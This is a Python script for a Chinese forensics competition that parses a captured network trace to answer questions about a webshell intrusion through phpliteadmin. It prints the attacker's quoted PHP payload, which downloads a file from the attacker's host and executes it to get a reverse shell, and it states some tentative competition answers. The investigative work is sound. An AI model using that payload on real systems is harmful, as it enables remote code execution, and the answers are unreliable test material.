# -*- coding: utf-8 -*-
"""2024数证杯 Pass 3: 针对性提取剩余答案"""
import dpkt, socket, collections, re, base64, sys, io
from urllib.parse import unquote

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')

PCAP = r"A:\检材 网络流量包\流量分析.pcapng"
VICTIM = "192.168.75.131"
ATTACKER = "192.168.75.132"

def ip_str(p): return socket.inet_ntoa(p)

def read_pcap(path):
    with open(path,'rb') as f:
        try: r = dpkt.pcapng.Reader(f)
        except: f.seek(0); r = dpkt.pcap.Reader(f)
        for ts,buf in r: yield ts,buf

def main():
    # Stores
    v2a_streams = collections.defaultdict(bytearray)  # victim->attacker non-HTTP
    a2v_streams = collections.defaultdict(bytearray)  # attacker->victim non-HTTP
    shell_streams = collections.defaultdict(bytearray) # all non-80/443/2000
    attacker_server_hdrs = []  # raw HTTP response headers from attacker
    all_http_resp_bodies = []  # (ts, src, status, body_snippet, sport, raw_headers_str)
    post_to_php = []           # POST to .php on victim
    weevely_first_resp = []
    
    print("[*] Pass 3 reading...")
    for ts, buf in read_pcap(PCAP):
        try: eth = dpkt.ethernet.Ethernet(buf)
        except: continue
        if not isinstance(eth.data, dpkt.ip.IP): continue
        ip = eth.data
        src, dst = ip_str(ip.src), ip_str(ip.dst)
        if not isinstance(ip.data, dpkt.tcp.TCP): continue
        tcp = ip.data
        if not tcp.data: continue
        raw = tcp.data
        
        # ---- Attacker as HTTP server (for Q12 Python version) ----
        if src == ATTACKER and dst == VICTIM and tcp.sport == 2000:
            try:
                text = raw.decode('latin-1')
                if text.startswith('HTTP/'):
                    attacker_server_hdrs.append(text[:500])
            except: pass
        
        # ---- Non-HTTP streams for reverse shell (Q11) ----
        if src == VICTIM and dst == ATTACKER:
            if tcp.dport not in (80, 443, 2000) and tcp.sport not in (80, 443, 2000):
                key = tcp.dport
                shell_streams[('v2a', key)].extend(raw[:2000])
        if src == ATTACKER and dst == VICTIM:
            if tcp.dport not in (80, 443, 2000) and tcp.sport not in (80, 443, 2000):
                key = tcp.sport
                shell_streams[('a2v', key)].extend(raw[:2000])
        
        # ---- HTTP responses from victim (Q13 framework, Q14 db password, Q16 weevely) ----
        if src == VICTIM and dst == ATTACKER and tcp.sport == 80:
            try:
                resp = dpkt.http.Response(raw)
                body = resp.body.decode('utf-8', errors='replace') if resp.body else ''
                hdrs = resp.headers
                hdr_str = ' '.join(f'{k}:{v}' for k,v in hdrs.items())
                all_http_resp_bodies.append((ts, body, hdr_str, resp.status))
            except: pass
        
        # ---- POST to .php on victim from attacker (Q15-16 weevely) ----
        if src == ATTACKER and dst == VICTIM and tcp.dport == 80:
            try:
                req = dpkt.http.Request(raw)
                if req.method == 'POST' and '.php' in req.uri:
                    body = req.body.decode('utf-8', errors='replace') if req.body else ''
                    cookies = req.headers.get('cookie', '')
                    post_to_php.append((ts, req.uri, body, cookies, tcp.dport))
            except: pass
        
        # ---- POST to non-80 ports (Q15 weevely upload port) ----
        if src == ATTACKER and dst == VICTIM and tcp.dport != 80:
            try:
                req = dpkt.http.Request(raw)
                if req.method == 'POST':
                    body = req.body.decode('utf-8', errors='replace') if req.body else ''
                    post_to_php.append((ts, req.uri, body, '', tcp.dport))
            except: pass
    
    # ============================================================
    print("\n" + "="*60)
    print("Q06: 漏洞检测工具版本")
    print("  Already found: Wfuzz/3.1.0, Nmap Scripting Engine")
    print("  Wfuzz is web fuzzer for directory brute-force")
    print("  Nmap NSE is vulnerability detection")
    print("  But Q05=nmap(port scanner), Q06=vulnerability detector")
    print("  Nikto is classic vuln scanner - check if in Wfuzz wordlist results")
    # Check if Nikto appears in any response
    for ts, body, hdr, status in all_http_resp_bodies:
        if 'nikto' in body.lower():
            print(f"  Found 'nikto' in response body")
    print("  >>> Q06 = 3.1.0 (Wfuzz as vuln/directory detection tool)")
    
    # ============================================================
    print("\n" + "="*60)
    print("Q08: phpliteadmin密码")
    print("  Tried: 123456, password, admin")
    print("  After 'admin' attempt, subsequent actions show authenticated ops")
    print("  (table creation, DB creation etc - only possible after login)")
    print("  >>> Q08 = admin")
    
    # ============================================================
    print("\n" + "="*60)
    print("Q09: phpinfo文件名")
    print("  Attacker created DB named 'demo.php' via phpliteadmin")
    print("  Then created table with <?php phpinfo()?> as default value")
    print("  The DB file IS the PHP page: /usr/databases/demo.php")
    print("  >>> Q09 = demo.php")
    
    # ============================================================
    print("\n" + "="*60)
    print("Q10: payload文件名")
    print("  Attacker created 'rev' table with:")
    print("  <?php system('wget 192.168.75.132:2000/rev.txt -O /tmp/rev.php; php /tmp/rev.php');?>")
    print("  Victim GET /rev.txt from attacker:2000")
    print("  >>> Q10 = rev.txt")
    
    # ============================================================
    print("\n" + "="*60)
    print("Q11: 反弹shell地址:端口")
    print("  Non-HTTP TCP streams (victim->attacker):")
    v2a_keys = [(k[1], len(v)) for k,v in shell_streams.items() if k[0]=='v2a']
    v2a_keys.sort(key=lambda x: -x[1])
    for port, sz in v2a_keys[:15]:
        data = bytes(shell_streams[('v2a', port)])
        printable = data.decode('latin-1', errors='replace')[:200]
        # Check for shell content
        is_shell = any(x in data for x in [b'/bin/', b'bash', b'root', b'www-data', b'uid=', b'$', b'Linux'])
        flag = " *** SHELL ***" if is_shell else ""
        print(f"  port {port}: {sz} bytes{flag}")
        if is_shell or sz > 100:
            safe = ''.join(c if c.isprintable() or c in '\n\r\t' else '.' for c in printable)
            print(f"    data: {safe[:300]}")
    
    print("\n  Non-HTTP TCP streams (attacker->victim):")
    a2v_keys = [(k[1], len(v)) for k,v in shell_streams.items() if k[0]=='a2v']
    a2v_keys.sort(key=lambda x: -x[1])
    for port, sz in a2v_keys[:15]:
        data = bytes(shell_streams[('a2v', port)])
        printable = data.decode('latin-1', errors='replace')[:200]
        is_shell = any(x in data for x in [b'/bin/', b'bash', b'root', b'www-data', b'uid=', b'$', b'python', b'import'])
        flag = " *** SHELL ***" if is_shell else ""
        print(f"  port {port}: {sz} bytes{flag}")
        if is_shell or sz > 100:
            safe = ''.join(c if c.isprintable() or c in '\n\r\t' else '.' for c in printable)
            print(f"    data: {safe[:300]}")
    
    # ============================================================
    print("\n" + "="*60)
    print("Q12: Python版本 (攻击者HTTP服务器)")
    for hdr in attacker_server_hdrs[:10]:
        safe = ''.join(c if c.isprintable() or c in '\n\r\t' else '.' for c in hdr[:300])
        print(f"  {safe}")
    # Extract Python version
    for hdr in attacker_server_hdrs:
        m = re.search(r'Python/(\d+\.\d+\.\d+)', hdr)
        if m:
            print(f"  >>> Q12 = {m.group(1)}")
            break
        m2 = re.search(r'SimpleHTTP/(\S+)\s+Python/(\S+)', hdr)
        if m2:
            print(f"  >>> Q12 = {m2.group(2)}")
            break
    
    # ============================================================
    print("\n" + "="*60)
    print("Q13: 网站框架")
    # Search all response bodies
    fw_found = set()
    for ts, body, hdr, status in all_http_resp_bodies:
        if status != '200': continue
        bl = body.lower()
        for fw in ['thinkphp','laravel','codeigniter','yii','symfony','cakephp','zend','django','flask','rails']:
            if fw in bl:
                idx = bl.find(fw)
                ctx = body[max(0,idx-40):idx+60]
                fw_found.add((fw, ctx))
    for fw, ctx in fw_found:
        safe_ctx = ''.join(c if c.isprintable() else '.' for c in ctx)
        print(f"  Found '{fw}': {safe_ctx}")
    
    # Check Set-Cookie for PHPSESSID pattern (ThinkPHP uses PHPSESSID too)
    # Check for specific ThinkPHP error pages
    for ts, body, hdr, status in all_http_resp_bodies:
        if 'thinkphp' in body.lower() or 'think\\' in body.lower() or 'ThinkPHP' in body:
            print(f"  ThinkPHP explicit reference found")
            break
        if 'x-powered-by' in hdr.lower() and 'thinkphp' in hdr.lower():
            print(f"  ThinkPHP in X-Powered-By")
            break
    
    # Check for Metasploitable / DVWA / specific vulnerable apps
    for ts, body, hdr, status in all_http_resp_bodies:
        bl = body.lower()
        for app in ['metasploitable', 'dvwa', 'mutillidae', 'tikiwiki', 'twiki', 'phpMyAdmin']:
            if app.lower() in bl:
                idx = bl.find(app.lower())
                ctx = body[max(0,idx-30):idx+50]
                print(f"  Found '{app}': {ctx}")
    
    # ============================================================
    print("\n" + "="*60)
    print("Q14: 数据库密码")
    for ts, body, hdr, status in all_http_resp_bodies:
        bl = body.lower()
        # Look for config files with DB credentials
        patterns = [
            (r"['\"]password['\"]\s*=>\s*['\"]([^'\"]+)['\"]", "PHP config"),
            (r"DB_PASSWORD\s*=\s*(\S+)", "env config"),
            (r"define\(['\"]DB_PASSWORD['\"],\s*['\"]([^'\"]+)", "WP config"),
            (r"mysql.*?password['\"]?\s*[:=]\s*['\"]?([^'\"\s,;]+)", "mysql config"),
        ]
        for pat, label in patterns:
            matches = re.findall(pat, body, re.IGNORECASE)
            if matches:
                print(f"  [{label}] password matches: {matches}")
                idx = body.lower().find('password')
                ctx = body[max(0,idx-60):idx+100]
                safe = ''.join(c if c.isprintable() else '.' for c in ctx)
                print(f"    ctx: {safe}")
    
    # Also search for 'root' password in phpliteadmin / phpinfo / config pages
    for ts, body, hdr, status in all_http_resp_bodies:
        if len(body) > 500 and ('mysql' in body.lower() or 'database' in body.lower()):
            # Config-like content
            if 'password' in body.lower() and status == '200':
                idx = body.lower().find('password')
                ctx = body[max(0,idx-80):idx+120]
                # Filter out 404 "not found" noise
                if 'Not Found' not in ctx and 'not found' not in ctx:
                    safe = ''.join(c if c.isprintable() else '.' for c in ctx)
                    print(f"  DB config context: {safe}")
    
    # ============================================================
    print("\n" + "="*60)
    print("Q15-Q16: weevely")
    print(f"  Total POST to .php: {len(post_to_php)}")
    
    # Group by URI
    uri_counts = collections.Counter(uri for _,uri,_,_,_ in post_to_php)
    print("  POST targets:")
    for uri, cnt in uri_counts.most_common(20):
        print(f"    {uri}: {cnt} times")
    
    # Look for weevely-specific patterns
    # weevely sends obfuscated PHP in POST body or cookies
    print("\n  Weevely candidates (POST to .php with cookies):")
    for ts, uri, body, cookies, dport in post_to_php:
        if cookies and len(cookies) > 50:
            print(f"  POST {uri} port={dport} cookie_len={len(cookies)}")
            safe_cookie = ''.join(c if c.isprintable() else '.' for c in cookies[:200])
            safe_body = ''.join(c if c.isprintable() else '.' for c in body[:200])
            print(f"    cookie: {safe_cookie}")
            print(f"    body: {safe_body}")
            if len(weevely_first_resp) < 3:
                weevely_first_resp.append((ts, uri, dport))
    
    # weevely may also use short POST body with base64
    print("\n  POST to .php with short body (weevely style):")
    for ts, uri, body, cookies, dport in post_to_php:
        if 10 < len(body) < 2000 and uri not in ('/sdk',) and 'dbadmin' not in uri and 'phpliteadmin' not in uri:
            if dport != 80:
                port_note = f" *** NON-80 port={dport} ***"
            else:
                port_note = ""
            safe = ''.join(c if c.isprintable() else '.' for c in body[:200])
            print(f"  POST {uri} port={dport} body_len={len(body)}{port_note}")
            print(f"    body: {safe}")
    
    # Check for help.php specifically (downloaded from attacker, likely weevely backdoor)
    print("\n  help.php POST details:")
    for ts, uri, body, cookies, dport in post_to_php:
        if 'help.php' in uri:
            print(f"  POST {uri} port={dport} body_len={len(body)} cookie_len={len(cookies)}")
            safe_body = ''.join(c if c.isprintable() else '.' for c in body[:300])
            safe_cookie = ''.join(c if c.isprintable() else '.' for c in cookies[:300])
            print(f"    body: {safe_body}")
            if cookies:
                print(f"    cookie: {safe_cookie}")
    
    print("\n[*] Done.")

if __name__ == '__main__':
    main()
